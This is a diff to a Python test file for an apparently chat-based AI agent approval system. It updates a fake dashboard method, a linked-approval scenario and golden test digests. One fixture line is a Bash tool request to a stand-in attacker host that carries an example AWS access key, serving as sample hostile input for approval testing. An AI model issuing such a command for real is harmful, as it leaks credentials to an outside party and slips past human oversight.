@@ -426,8 +426,13 @@ class _Dashboard:
         self._log.add("dashboard.get_linked_slot", thread_ts=thread_ts)
         return self._linked
 
-    def resolve_approval(self, request_id, approved):
-        self._log.add("dashboard.resolve_approval", request_id=request_id, approved=approved)
+    def resolve_slot_approval(self, slot, request_id, approved, *, expected_future=None):
+        self._log.add(
+            "dashboard.resolve_slot_approval",
+            slot=slot.key,
+            request_id=request_id,
+            approved=approved,
+        )
         return True
 
     def push_slots_update(self):
@@ -454,6 +459,7 @@ async def _scenario_linked_approval(log):
             "dashboard:chat-1",
             "Bash https://evil.example.invalid/?k=AKIAIOSFODNN7EXAMPLE",
             "echo hi",
+            slot_key="chat-1",
         )
         log.add("linked.posted", ts=ts, registry=sorted(handler._linked_approvals))
         result = await handler.handle_interaction(
@@ -1009,7 +1015,7 @@ _GOLDEN_DIGESTS: dict[str, str] = {
     "error_timeout": "608f9764fe3ed40a4e758a69d881f2c829e08a6aa89302e9f007a1c1b463db44",
     "error_unexpected": "ae7bc265f3ffd8441f818df443f1586b1e0f3c6d2009d7b707220f0b6e92829a",
     "hook_auto_reply": "f976c5ff2c752a2259381bcfd9fbf6e2fb72ca95fcdb1bbfa53c5ddf98f68f53",
-    "hook_deny_and_flag": "0cf7af0e949723738338810993c3454dbe2da49ca88c231905b2a68fc36944eb",
+    "hook_deny_and_flag": "e79ac03814431a60817e2f4e734ec3230ea3140c0af85e289184df6bec622b88",
     "interaction_edges": "80e9ab4e4ba623f57a0360df952f7d6c787348fc81ff69368bbfcfb2ce22bc8f",
     "interactive_approve": "b20c7df4968528b252f984f62503202294c5c0caa75eb04be3231f2310ef5110",
     "interactive_approve_answered": "08dd0d7d62480853b98cff28fa65d158d327339f2dd69ed2b74fbbbfe8c6356a",
@@ -1017,8 +1023,8 @@ _GOLDEN_DIGESTS: dict[str, str] = {
     "interactive_timeout": "e2a9e8c0d6398cbe68f81f17eb94ade5c20921c6221d4100f521ac5736448e30",
     "interactive_trust_in_dm": "8b16590ebe23568228ed607a24202a50b8edc4e80aef76e5774c7bef013e5ad5",
     "keyword_commands": "2acbad12808587a76ab0d64101da6d512b3ba8f0bc1f28ed2dab246d7a88b386",
-    "linked_approval": "8a85aaf602b5281707519634a49589c814694ac0f9c7b71164bbdaa2cc474bc9",
-    "linked_dashboard_session": "e6506d984333f8528fd5f563d745448b0d4c3a83d28a3fa900b6bb8f222f3856",
+    "linked_approval": "fd9f6840aa0486ea1af5d8380a8c28c5803407faed28e6271913603adb0d5fd4",
+    "linked_dashboard_session": "2c49bd5afefcf913c1ab6a60bdeed6a7a3c21e826e5ffa985f0abe3e6959c0f9",
     "linked_thread_routes_to_slot": "0a481316843499aaa985a421a16e4c2510f5a1ff7b1a9a56e9f6cf4a37832e6e",
     "mention_prefixed_bang": "48e18741859e097ccf60e7d04b6c70546baa391b3451b065b997348a4a5d7734",
     "pinned_answer": "28c748b1cf0d80d87ab2efccaf102d311fcc583d2a63992bc2fb86a5fb829016",
@@ -1035,7 +1041,7 @@ _GOLDEN_DIGESTS: dict[str, str] = {
     "transport_floor_refusal": "9fb31cc46463b655120bcd722e0a1a7b70c07037bc472d606b76c451bab30ea3",
     "trusted_session": "07445e20db083c7eaf2f75b3590ad82a9637bc4add04a00226c42b26b3ec4058",
     "turn_ceiling_and_shutdown": "e19f2cde78799109801f78a2eea9e872d4ca85828085cb2d59ae4ff03b0864cd",
-    "turn_with_history": "db9b4f05d1388068d09b10eb0b2da0817ad379083046c29d43381f76757ead10",
+    "turn_with_history": "9415bdf1a846b40534a50e347334a7f4fba33b1fa54c840e3d9d94ae606efa1c",
     "unstreamed_long_reply": "24762f37e6a615577ccdb6f679d8c5cc8bc217a41620d12a1c1306d454cb4a46",
     "unstreamed_tool_and_auto_approval": "cfe992c51ae6285338d5081142175a990428ecd963ab312766c8439b8f697c1f",
     "voice_reply_requested": "24c013573da87bd3c996764096b05815b5104674ed61feca7897e9ad10eac93f",
